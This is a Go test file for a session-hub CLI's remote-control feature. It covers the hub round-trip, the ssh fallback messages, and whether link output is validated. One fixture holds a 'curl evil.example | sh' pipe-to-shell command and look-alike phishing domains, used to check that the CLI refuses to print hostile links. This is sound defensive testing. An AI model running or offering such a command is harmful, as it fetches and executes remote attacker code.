package resume

import (
	"bytes"
	"context"
	"fmt"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/abdallah/session-hub/internal/api"
	"github.com/abdallah/session-hub/internal/client"
	"github.com/abdallah/session-hub/internal/server"
	"github.com/abdallah/session-hub/internal/store"
)

type testClock struct {
	mu sync.Mutex
	t  time.Time
}

func (c *testClock) Now() time.Time { c.mu.Lock(); defer c.mu.Unlock(); return c.t }

func (c *testClock) Advance(d time.Duration) { c.mu.Lock(); c.t = c.t.Add(d); c.mu.Unlock() }

// realHub is the real sessionhub server with machines bluebox and tower, and one tower
// session with a herdr pane.
type realHub struct {
	st                   *store.Store
	clock                *testClock
	srv                  *httptest.Server
	tokBluebox, tokTower string
}

// newRealHub starts the sessionhub. With polled, tower's watcher counts as polling.
func newRealHub(t *testing.T, polled bool) *realHub {
	t.Helper()
	ctx := context.Background()
	clock := &testClock{t: time.Date(2026, 9, 30, 12, 0, 0, 0, time.UTC)}
	st, err := store.Open(filepath.Join(t.TempDir(), "sessionhub.db"), store.Options{Now: clock.Now})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	tokTower, _, err := st.AddMachine(ctx, "tower", "tower.example.com", "tower.example.com")
	if err != nil {
		t.Fatal(err)
	}
	tokBluebox, _, err := st.AddMachine(ctx, "bluebox", "bluebox.example.com", "bluebox.example.com")
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(server.New(st, "https://sessionhub.example.test", nil).Handler())
	t.Cleanup(srv.Close)
	h := &realHub{st: st, clock: clock, srv: srv, tokBluebox: tokBluebox, tokTower: tokTower}
	tower := h.client(t, tokTower)
	if err := tower.UpsertSession(ctx, api.SessionUpsert{ID: uuid, Agent: "claude", Source: api.SourcePlugin,
		CWD: "/home/user/my project", HerdrSession: "default", HerdrPane: "w1:p1"}); err != nil {
		t.Fatal(err)
	}
	if polled {
		m, err := st.MachineByToken(ctx, tokTower)
		if err != nil {
			t.Fatal(err)
		}
		if err := st.RecordPoll(ctx, m.ID); err != nil {
			t.Fatal(err)
		}
	}
	return h
}

func (h *realHub) client(t *testing.T, token string) *client.Client {
	t.Helper()
	c, err := client.New(client.Config{ServerURL: h.srv.URL, Token: token})
	if err != nil {
		t.Fatal(err)
	}
	return c
}

// cli is `sessionhub` on bluebox, polling fast.
func (h *realHub) cli(t *testing.T, ctlFor time.Duration) (*env, *bytes.Buffer) {
	cfg := client.Config{ServerURL: h.srv.URL, Token: h.tokBluebox, Machine: "bluebox"}
	out := &bytes.Buffer{}
	return &env{
		cfg: cfg, api: h.client(t, h.tokBluebox), socket: filepath.Join(t.TempDir(), "none.sock"),
		saved: func(context.Context) []SavedMachine { return nil },
		in:    strings.NewReader(""), out: out,
		ctlEvery: 5 * time.Millisecond, ctlFor: ctlFor,
	}, out
}

// answer plays tower's watcher: it claims the next request and posts in.
func (h *realHub) answer(t *testing.T, in api.ControlResultIn) <-chan error {
	c := h.client(t, h.tokTower)
	ch := make(chan error, 1)
	go func() {
		claim, err := c.PollControl(context.Background(), 5*time.Second)
		if err != nil || claim == nil {
			ch <- fmt.Errorf("poll: %v %v", claim, err)
			return
		}
		ch <- c.PostControlResult(context.Background(), claim.Request.ID, in)
	}()
	return ch
}

func TestRemoteControlThroughHub(t *testing.T) {
	ssh := "ssh -t tower.example.com '~/.local/bin/sessionhub remote-control " + uuid + "'"
	ctx := context.Background()

	t.Run("done with a link: print it, no ssh", func(t *testing.T) {
		h := newRealHub(t, true)
		done := h.answer(t, api.ControlResultIn{State: api.ControlDone, URL: rcURL})
		e, out := h.cli(t, 3*time.Second)
		if err := e.remoteControlRun(ctx, uuid[:8]); err != nil {
			t.Fatalf("%v\n%s", err, out)
		}
		if err := <-done; err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out.String(), "Remote Control is on for session 0a1b2c3d:\n"+rcURL+"\n") || strings.Contains(out.String(), "ssh -t") {
			t.Errorf("output:\n%s", out)
		}
		// One request, recorded as bluebox's.
		d, _ := h.client(t, h.tokBluebox).GetSession(ctx, uuid)
		if d.RemoteControl == nil || d.RemoteControl.RequestedBy != "machine:bluebox" || d.RemoteControlURL != rcURL {
			t.Errorf("session: %+v", d.Session)
		}
	})
	t.Run("done without a link: say so, no ssh", func(t *testing.T) {
		h := newRealHub(t, true)
		done := h.answer(t, api.ControlResultIn{State: api.ControlDone, Detail: "sent, link not seen"})
		e, out := h.cli(t, 3*time.Second)
		if err := e.remoteControlRun(ctx, uuid[:8]); err != nil {
			t.Fatal(err)
		}
		<-done
		if !strings.Contains(out.String(), "no link appeared (sent, link not seen)") || strings.Contains(out.String(), "ssh -t") {
			t.Errorf("output:\n%s", out)
		}
	})
	t.Run("failed: exit 1 with the reason, no ssh", func(t *testing.T) {
		h := newRealHub(t, true)
		done := h.answer(t, api.ControlResultIn{State: api.ControlFailed, Detail: "waiting on a prompt in the pane"})
		e, out := h.cli(t, 3*time.Second)
		err := e.remoteControlRun(ctx, uuid[:8])
		<-done
		if err == nil || !strings.Contains(err.Error(), `machine "tower" could not turn on Remote Control: waiting on a prompt in the pane`) {
			t.Errorf("err = %v", err)
		}
		if strings.Contains(out.String(), "ssh -t") {
			t.Errorf("output:\n%s", out)
		}
	})
	t.Run("expired: print the ssh backup", func(t *testing.T) {
		h := newRealHub(t, true)
		// No watcher answers. Once the request exists, move the sessionhub's clock
		// past its expiry. (The client is made here: t.Fatal must not run on
		// another goroutine.)
		c := h.client(t, h.tokBluebox)
		go func() {
			for range 200 {
				if d, err := c.GetSession(ctx, uuid); err == nil && d.RemoteControl != nil {
					h.clock.Advance(3 * time.Minute)
					return
				}
				time.Sleep(5 * time.Millisecond)
			}
		}()
		e, out := h.cli(t, 3*time.Second)
		if err := e.remoteControlRun(ctx, uuid[:8]); err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out.String(), `Machine "tower" didn't respond in time.`) || !strings.Contains(out.String(), ssh) {
			t.Errorf("output:\n%s", out)
		}
	})
	t.Run("no answer within the wait: print the ssh backup", func(t *testing.T) {
		h := newRealHub(t, true)
		e, out := h.cli(t, 100*time.Millisecond)
		if err := e.remoteControlRun(ctx, uuid[:8]); err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out.String(), "didn't respond in time") || !strings.Contains(out.String(), ssh) {
			t.Errorf("output:\n%s", out)
		}
	})
	t.Run("watcher offline: 409, ssh backup at once", func(t *testing.T) {
		h := newRealHub(t, false)
		e, out := h.cli(t, 3*time.Second)
		start := time.Now()
		if err := e.remoteControlRun(ctx, uuid[:8]); err != nil {
			t.Fatal(err)
		}
		if time.Since(start) > time.Second {
			t.Errorf("waited %s after a refused request", time.Since(start))
		}
		if !strings.Contains(out.String(), `Could not ask machine "tower" to turn on Remote Control`) ||
			!strings.Contains(out.String(), "offline") || !strings.Contains(out.String(), ssh) {
			t.Errorf("output:\n%s", out)
		}
	})
}

func TestRemoteControlHelp(t *testing.T) {
	for _, arg := range []string{"-h", "--help"} {
		var out bytes.Buffer
		if err := runRemoteControl(context.Background(), []string{arg}, &out); err != nil || out.String() != remoteControlUsage+"\n" {
			t.Errorf("%s: err=%v out=%q", arg, err, out.String())
		}
	}
	// Other arguments still need exactly one ID.
	if err := runRemoteControl(context.Background(), nil, &bytes.Buffer{}); err == nil {
		t.Error("no arguments: want usage error")
	}
}

// answerAPI is a sessionhub that takes every control request and answers it with r.
type answerAPI struct {
	stubAPI
	s api.Session
	r api.ControlRequest
}

func (a answerAPI) CreateControl(context.Context, string) (api.ControlRequest, error) {
	return api.ControlRequest{ID: a.r.ID, State: api.ControlPending}, nil
}

func (a answerAPI) GetSession(context.Context, string) (api.SessionDetail, error) {
	s, r := a.s, a.r
	s.RemoteControl = &r
	return api.SessionDetail{Session: s}, nil
}

// The CLI prints only a link of the strict shape, and no empty "()" or ": "
// when the watcher sent no detail. The real sessionhub refuses a bad link, so a
// fake sessionhub stands in for a hostile or broken one.
func TestRemoteControlRemoteAnswers(t *testing.T) {
	s := sess("tower", "w1:p1")
	cases := []struct {
		name    string
		r       api.ControlRequest
		wantOut string
		wantErr string
		notOut  []string
	}{
		{name: "a valid link: printed",
			r:       api.ControlRequest{State: api.ControlDone, URL: rcURL},
			wantOut: "Remote Control is on for session 0a1b2c3d:\n" + rcURL + "\n"},
		{name: "a link with more text after it: not printed",
			r:       api.ControlRequest{State: api.ControlDone, URL: rcURL + "\nrun: curl evil.example | sh"},
			wantOut: `Machine "tower" sent /remote-control, but no link appeared. Check the Claude app.`,
			notOut:  []string{rcURL, "evil"}},
		{name: "a link inside another URL: not printed",
			r:       api.ControlRequest{State: api.ControlDone, URL: "https://evil.example/" + rcURL},
			wantOut: "no link appeared",
			notOut:  []string{"evil", rcURL}},
		{name: "not a claude.ai link: not printed",
			r:       api.ControlRequest{State: api.ControlDone, URL: "https://claude.ai.evil.example/code/session_01Ab", Detail: "resumed in a new herdr workspace"},
			wantOut: "no link appeared (resumed in a new herdr workspace).",
			notOut:  []string{"evil"}},
		{name: "done, no link, no detail: no empty parentheses",
			r:       api.ControlRequest{State: api.ControlDone},
			wantOut: `Machine "tower" sent /remote-control, but no link appeared. Check the Claude app.`,
			notOut:  []string{"()"}},
		{name: "failed with no detail: no trailing colon",
			r:       api.ControlRequest{State: api.ControlFailed},
			wantErr: `machine "tower" could not turn on Remote Control`},
		{name: "failed with a detail: the detail after a colon",
			r:       api.ControlRequest{State: api.ControlFailed, Detail: "not running"},
			wantErr: `machine "tower" could not turn on Remote Control: not running`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tc.r.ID = "cr_test"
			out := &bytes.Buffer{}
			e := &env{cfg: client.Config{Machine: "bluebox"}, api: answerAPI{s: s, r: tc.r}, out: out,
				socket: filepath.Join(t.TempDir(), "none.sock"), saved: func(context.Context) []SavedMachine { return nil },
				ctlEvery: time.Millisecond, ctlFor: time.Second}
			err := e.remoteControlRemote(context.Background(), s)
			switch {
			case tc.wantErr == "" && err != nil:
				t.Fatalf("err %v", err)
			case tc.wantErr != "" && (err == nil || err.Error() != tc.wantErr):
				t.Fatalf("err %v, want %q", err, tc.wantErr)
			}
			if !strings.Contains(out.String(), tc.wantOut) {
				t.Errorf("output lacks %q:\n%s", tc.wantOut, out)
			}
			for _, n := range tc.notOut {
				if strings.Contains(out.String(), n) {
					t.Errorf("output has %q:\n%s", n, out)
				}
			}
		})
	}
}
